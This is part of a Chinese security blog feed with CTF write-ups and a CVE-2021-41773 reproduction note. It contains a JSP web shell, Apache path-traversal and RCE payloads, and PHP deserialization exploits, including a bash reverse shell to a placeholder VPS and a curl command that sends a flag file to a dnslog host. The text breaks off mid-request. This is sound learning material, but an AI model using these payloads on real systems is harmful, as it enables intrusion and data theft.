    <content type="html"><![CDATA[<h2 id="上传你的头像吧"><a href="#上传你的头像吧" class="headerlink" title="上传你的头像吧"></a>上传你的头像吧</h2><p><code>文件上传竞争</code></p><p>题目中对于上传的文件是先保存到服务器上再检查是否符合规范才进行删除，所以可以边上传边访问，和删除竞争；在删除前访问到木马文件，得到flag</p><p>上传：<br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112122321856.png"><br>访问：<br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112122321698.png"></p><h2 id="上传你的压缩包吧"><a href="#上传你的压缩包吧" class="headerlink" title="上传你的压缩包吧"></a>上传你的压缩包吧</h2><p>上传压缩包，会自动解压，<br><code>Tomcat</code></p><p>上传<code>.jsp</code>马，但上传的文件目录<code>jsp</code>文件不能访问，所以要上传到上一级目录，修改<code>aaaa.jsp</code>为<code>../a.jsp</code></p><p>在<code>burp-&gt;hex</code>里或者winhex,010editor里应该都行，但我一个都没成功。。。。。。。。。。。。。。。。</p><p>网上的jsp马</p><pre class="language-jsp" data-language="jsp"><code class="language-jsp">&lt;%if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;java.io.InputStream in &#x3D;Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();int a &#x3D; -1;byte[] b &#x3D; new byte[2048];out.print(&quot;&lt;pre&gt;&quot;);while((a&#x3D;in.read(b))!&#x3D;-1)&#123;out.println(new String(b));&#125;out.print(&quot;&lt;&#x2F;pre&gt;&quot;);&#125;%&gt;</code></pre><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112122326594.png"></p><h2 id="休想爆破我"><a href="#休想爆破我" class="headerlink" title="休想爆破我"></a>休想爆破我</h2><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112122344902.png"><br>扫到<br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112122329820.png"></p><p><code>heapdump</code>放到<code>visualVM</code>分析<br><a href="https://www.cnblogs.com/icez/p/Actuator_heapdump_exploit.html">Actuator 未授权访问之heapdump利用 </a></p><p><code>查找Shiro CipherKey</code><br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112122332753.png"></p><p>脚本对byte转换为base64编码的key</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">import</span> structa<span class="token operator">=</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'&lt;bbbbbbbbbbbbbbbb'</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">114</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">,</span> <span class="token number">86</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">45</span><span class="token punctuation">,</span><span class="token number">69</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">107</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">38</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">72</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">23</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span></code></pre><p>shiro利用工具</p><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112122333889.png"></p><p><code>cat /flag</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;上传你的头像吧&quot;&gt;&lt;a href=&quot;#上传你的头像吧&quot; class=&quot;headerlink&quot; title=&quot;上传你的头像吧&quot;&gt;&lt;/a&gt;上传你的头像吧&lt;/h2&gt;&lt;p&gt;&lt;code&gt;文件上传竞争&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;题目中对于上传的文件是先保存到服务器上再检查是</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="wp" scheme="http://lll-nnn.github.io/categories/CTF/wp/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="金盾杯" scheme="http://lll-nnn.github.io/tags/%E9%87%91%E7%9B%BE%E6%9D%AF/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2021-41773</title>
    <link href="http://lll-nnn.github.io/2021/11/29/CVE-2021-41773/"/>
    <id>http://lll-nnn.github.io/2021/11/29/CVE-2021-41773/</id>
    <published>2021-11-29T02:24:01.000Z</published>
    <updated>2021-11-29T02:37:54.806Z</updated>
    
    <content type="html"><![CDATA[<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>仅apache 2.4.49</p><h2 id="apache-目录穿越"><a href="#apache-目录穿越" class="headerlink" title="apache 目录穿越"></a>apache 目录穿越</h2><p>payload：<code>/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</code></p><p><code>/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</code></p><h2 id="apache-rce"><a href="#apache-rce" class="headerlink" title="apache rce"></a>apache rce</h2><p>需要启用<code>mod_cgid</code>和<code>mod_cgi</code>模块</p><p><code>mod_cgi</code>模块的功能是根据输入脚本类型选择不同解析器进行执行，常用的解析器有<code>php</code>、<code>perl</code>等</p><p>payload:</p><pre><code>POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1Host: xx.xx.xx.xx:8080User-Agent: curl/7.64.1Accept: */*Content-Length: 7Content-Type: application/x-www-form-urlencodedConnection: closeecho;id</code></pre><p><img src="https://s3.bmp.ovh/imgs/2021/11/0e261738473bf027.png"></p><p><a href="https://blog.csdn.net/qq_38376348/article/details/120655436">CVE-2021-41773 Apache HTTP Server漏洞复现</a>   </p><p><a href="https://mp.weixin.qq.com/s/mx7_wTnU7IWxzeG7e6faTQ?st=A3E9947CC72763237BE9E767B200882D1648B7C0060F65A11B588C63933F3FDB30F9CE3EEDF8A35AD341979ED668A754DD5F1E2AFCB710029B6DC92BC1A87C0DA439302C4A4AB04FFDE6CC47D2FBA6A5F1A0F2E0EB04443FC9F5A55F12409243D5C0711080FFD5BC323D747C57AEC1B39E37427C6A70C7C19BED4BF6C9C75FCCA459EE690735F1E2A7D4293A25537FCD92375C7254420FB4056BC664796B47A34A1900D539AC737D5321803DC0FB4CE1&vid=1688851090137202&cst=BD2948FD4785C65961435AA26F6775293D3B23260F41BE812666D55A2B47E6459197EF59B0467B11CD18458E3E28819A&deviceid=579d18aa-691c-4ffd-8a54-deef2535f414&version=3.1.16.90294&platform=mac">CVE-2021-41773升华篇-Apache HTTP Server 路径穿越漏洞提升至RCE回显深入分析 </a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;利用条件&quot;&gt;&lt;a href=&quot;#利用条件&quot; class=&quot;headerlink&quot; title=&quot;利用条件&quot;&gt;&lt;/a&gt;利用条件&lt;/h2&gt;&lt;p&gt;仅apache 2.4.49&lt;/p&gt;
&lt;h2 id=&quot;apache-目录穿越&quot;&gt;&lt;a href=&quot;#apache-目录穿越&quot;</summary>
      
    
    
    
    <category term="CVE" scheme="http://lll-nnn.github.io/categories/CVE/"/>
    
    
    <category term="信息安全" scheme="http://lll-nnn.github.io/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="CVE" scheme="http://lll-nnn.github.io/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>Geekchallenge</title>
    <link href="http://lll-nnn.github.io/2021/11/26/geekchallenge/"/>
    <id>http://lll-nnn.github.io/2021/11/26/geekchallenge/</id>
    <published>2021-11-25T16:31:46.000Z</published>
    <updated>2021-12-01T16:22:38.110Z</updated>
    
    <content type="html"><![CDATA[<h2 id="temp"><a href="#temp" class="headerlink" title="temp"></a>temp</h2><p>这道不是极客大挑战的，就写这里吧</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--if($_REQUEST['mode']!="begin")&#123;    die("Welcome PHP Games!");&#125;--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token single-quoted-string string">'fl4g.php'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'mode'</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token double-quoted-string string">"begin"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"PHP Games!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">last_task</span><span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> <span class="token variable">$left</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> <span class="token variable">$middle</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> <span class="token variable">$right</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$b</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">==</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"wrong way"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"need a little magic"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token variable">$token</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token double-quoted-string string">"user"</span><span class="token operator">&amp;&amp;</span><span class="token variable">$token</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pass'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token double-quoted-string string">"pass"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                        <span class="token variable">$flag</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                            <span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token variable">$flag</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">middle</span> <span class="token operator">=</span> <span class="token variable">$fl4g</span><span class="token punctuation">;</span>                            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">middle</span><span class="token operator">===</span><span class="token variable">$flag</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">left</span><span class="token operator">&amp;&amp;</span><span class="token variable">$flag</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">middle</span><span class="token operator">===</span><span class="token variable">$flag</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">right</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                                <span class="token keyword">echo</span> <span class="token double-quoted-string string">"this is your flag "</span><span class="token punctuation">.</span><span class="token variable">$flag</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">middle</span><span class="token punctuation">;</span>                            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"one more step"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">&#125;</span>                        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"don't give up"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Not a valid token"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"give me the token"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> </code></pre><p>主要是最后一关<br>exp:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">last_task</span><span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> <span class="token variable">$left</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> <span class="token variable">$middle</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> <span class="token variable">$right</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">last_task</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">left</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">middle</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">right</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">left</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>取地址<code>&amp;</code>符号可太行了，我怎么想不到呢。。。。。。。。</p><h2 id="babyPOP"><a href="#babyPOP" class="headerlink" title="babyPOP"></a>babyPOP</h2><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">a</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token variable">$Do_u_like_JiaRan</span> <span class="token operator">=</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token variable">$Do_u_like_AFKL</span> <span class="token operator">=</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">b</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$i_want_2_listen_2_MaoZhongDu</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>a<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$Do_u_like_AFKL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">i_want_2_listen_2_MaoZhongDu</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Noooooooooooooooooooooooooooo!!!!!!!!!!!!!!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">c</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        a<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$Do_u_like_JiaRan</span> <span class="token operator">=</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">d</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        a<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$Do_u_like_AFKL</span> <span class="token operator">=</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token double-quoted-string string">"关注嘉然,"</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">value</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">e</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>a<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$Do_u_like_JiaRan</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">afkl</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Noooooooooooooooooooooooooooo!!!!!!!!!!!!!!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </span></code></pre><p>一道反序列化，值得注意的是，static变量不能被反序列化<br>所以在写exp时就不能带<code>class a</code>了</p><p>exp:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">b</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$i_want_2_listen_2_MaoZhongDu</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">i_want_2_listen_2_MaoZhongDu</span><span class="token operator">=</span><span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">c</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$Do_u_like_JiaRan</span> <span class="token operator">=</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">d</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//$this.value=new b();</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$Do_u_like_AFKL</span> <span class="token operator">=</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token double-quoted-string string">"关注嘉然,"</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">value</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">e</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$Do_u_like_JiaRan</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">afkl</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Noooooooooooooooooooooooooooo!!!!!!!!!!!!!!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">b</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'bash -c "bash -i >&amp; /dev/tcp/[vps-ip]/9999 0>&amp;1"'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">c</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$d</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">d</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$d</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">value</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token variable">$e</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">e</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$e</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">afkl</span> <span class="token operator">=</span> <span class="token variable">$d</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token variable">$c</span><span class="token punctuation">,</span><span class="token variable">$e</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"\n"</span><span class="token punctuation">;</span></span></code></pre><p>最后将c和e作为一个数组进行序列化，也就是这里是两个入口，以前做的反序列化都是找一个入口，然后一步一步推，原来还可以两个一起，属实是学废了</p><p>还有就是关于反弹shell，我一开始弹，端口在阿里云也开了，就是弹不出来，甚至怀疑自己买了假的服务器，之后突然想到服务器上安了宝塔，看了一眼，果然，宝塔的防火墙端口没开，打开就弹出来了，wssb</p><p>dnslog带出<code>curl `cat /flag|base64`.xxxxxx.dnslog.cn</code></p><h2 id="期末不挂科就算成功"><a href="#期末不挂科就算成功" class="headerlink" title="期末不挂科就算成功"></a>期末不挂科就算成功</h2><p><img src="https://s3.bmp.ovh/imgs/2021/11/a087dd443ee23e03.png"><br>注释中发现<code>/debug.php</code><br>进入后是用文件包含，伪协议读取下<code>index.php</code><br>额外信息：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment">#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment">#curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//你当前位于学校172.17.0.0/24网段下 其实还有台机子里面可以修改成绩 我偷偷告诉你password是123456,name是admin,//result必须要改成60 不然学校会查的！！！</span><span class="token delimiter important">?></span></span></code></pre><p>在<code>172.17.0.7</code>中除了先前有的还出现了一张图片，应该就是这里了，然后就不会了。<br>看WP要<code>gopher</code>协议<code>post</code></p><pre><code>POST /index.php HTTP/1.1Host: 127.0.0.1Content-Type: application/x-www-form-urlencodedContent-Length: 